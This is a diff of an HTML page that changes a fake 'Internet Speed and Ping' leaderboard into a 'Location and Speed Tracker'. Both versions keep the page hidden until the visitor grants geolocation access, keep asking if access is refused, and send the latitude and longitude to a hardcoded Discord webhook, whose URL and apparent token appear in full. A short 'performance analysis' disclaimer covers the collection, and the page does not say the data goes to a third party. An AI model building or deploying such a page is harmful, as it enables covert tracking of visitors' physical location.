@@ -3,58 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Leaderboard</title>
+    <title>Location and Speed Tracker</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; margin: 0; }
-        #a { display: none; }
-        .e { color: red; font-size: 18px; margin-top: 50px; }
-        .c { font-size: 18px; margin-top: 50px; }
-        #i { margin-top: 20px; width: 80%; margin-left: 10%; border-collapse: collapse; }
-        #i th, #i td { border: 1px solid #ddd; padding: 8px; }
-        #i th { background-color: #f2f2f2; }
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #e7f0f2;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            background-color: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .message {
+            font-size: 18px;
+            margin-top: 20px;
+            color: #333;
+        }
+        .loading-message {
+            color: #f9c74f;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .error-message {
+            color: #f94144;
+            font-size: 16px;
+            margin-top: 10px;
+            display: none;
+        }
+        .location-details {
+            background-color: #f1f1f1;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+        .location-details p {
+            font-size: 16px;
+            color: #333;
+        }
     </style>
 </head>
 <body>
-    <div id="a">
+    <div class="container" id="a">
         <header>
-            <h1>Leaderboard: Internet Speed and Ping</h1>
+            <h1>Location and Speed Tracker</h1>
         </header>
-        <div class="d">
-            <p><strong>Disclaimer:</strong> Your location, internet speed, and ping are being captured for performance analysis.</p>
+        <div class="message">
+            <p><strong>Disclaimer:</strong> Your location is being captured for performance analysis.</p>
         </div>
-        <div class="e">
-            <p><strong>Your Location:</strong> <span id="f">Loading...</span></p>
-            <p><strong>Internet Speed:</strong> <span id="g">Loading...</span></p>
-            <p><strong>Ping:</strong> <span id="h">Loading...</span></p>
+        <div class="loading-message" id="k">Requesting location access...</div>
+        <div class="error-message" id="j">
+            <p><strong>Location access is required to use this service.</strong></p>
         </div>
-        <table id="i">
-            <thead>
-                <tr>
-                    <th>Rank</th>
-                    <th>Internet Speed (Mbps)</th>
-                    <th>Ping (ms)</th>
-                </tr>
-            </thead>
-            <tbody></tbody>
-        </table>
+        <div class="location-details" id="location-details" style="display:none;">
+            <h2>Your Location Data</h2>
+            <p><strong>Latitude:</strong> <span id="latitude">Loading...</span></p>
+            <p><strong>Longitude:</strong> <span id="longitude">Loading...</span></p>
+        </div>
     </div>
-    <p id="j" class="e" style="display:none;">Location access is required to use this site.</p>
-    <p id="k" class="c" style="display:none;">Requesting location access...</p>
 
     <script>
         // Replace with your actual webhook URL
         const webhookURL = "https://discord.com/api/webhooks/1336044790646571100/p4HcckTNGA-ByqvM64Nn2qwPz7fP1tIm-naVtwxoqF56-lx6_RkZUI1djZW2vDAWPTRM";
 
-        // Function to send data to the Discord webhook
-        function sendToWebhook(location, speed, ping) {
+        // Function to send location data to the Discord webhook
+        function sendLocationToWebhook(location) {
             const payload = {
-                content: `Location: Latitude: ${location.lat}, Longitude: ${location.lon}`,
+                content: "Location Data",
                 embeds: [
                     {
-                        title: "Network Data",
+                        title: "Location",
                         fields: [
-                            { name: "Internet Speed", value: `${speed} Mbps`, inline: true },
-                            { name: "Ping", value: `${ping} ms`, inline: true }
+                            { name: "Latitude", value: `${location.lat}`, inline: true },
+                            { name: "Longitude", value: `${location.lon}`, inline: true }
                         ]
                     }
                 ]
@@ -67,18 +98,6 @@
             });
         }
 
-        // Function to update internet speed and ping
-        function updateNetworkStats() {
-            let speed = "Unavailable";
-            let ping = "Unavailable";
-            if (navigator.connection) {
-                speed = navigator.connection.downlink || "Unavailable";
-                ping = navigator.connection.rtt || "Unavailable";
-            }
-            document.getElementById('g').textContent = `${speed} Mbps`;
-            document.getElementById('h').textContent = `${ping} ms`;
-        }
-
         // Function to request the user's location and refresh once granted
         function requestLocation() {
             document.getElementById('k').style.display = "block"; // Show "Requesting location access..." message
@@ -87,23 +106,17 @@
                     // Successfully got the location
                     document.getElementById('k').style.display = "none"; // Hide loading message
                     document.getElementById('j').style.display = "none"; // Hide location error message
-                    document.getElementById('a').style.display = "block"; // Show the leaderboard content
+                    document.getElementById('a').style.display = "block"; // Show the location details
 
                     // Store the location coordinates
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    document.getElementById('f').textContent = `Latitude: ${lat}, Longitude: ${lon}`;
+                    document.getElementById('latitude').textContent = lat;
+                    document.getElementById('longitude').textContent = lon;
 
-                    // Get network stats (internet speed and ping)
-                    updateNetworkStats();
+                    // Send the location data to the Discord webhook (only once)
+                    sendLocationToWebhook({ lat, lon });
 
-                    // Send the data to the Discord webhook
-                    sendToWebhook({lat, lon}, navigator.connection.downlink, navigator.connection.rtt);
-
-                    // Refresh the page after 3 seconds
-                    setTimeout(function() {
-                        location.reload();
-                    }, 3000);
                 }, function() {
                     // Failed to get location, ask again
                     document.getElementById('k').style.display = "none"; // Hide loading message
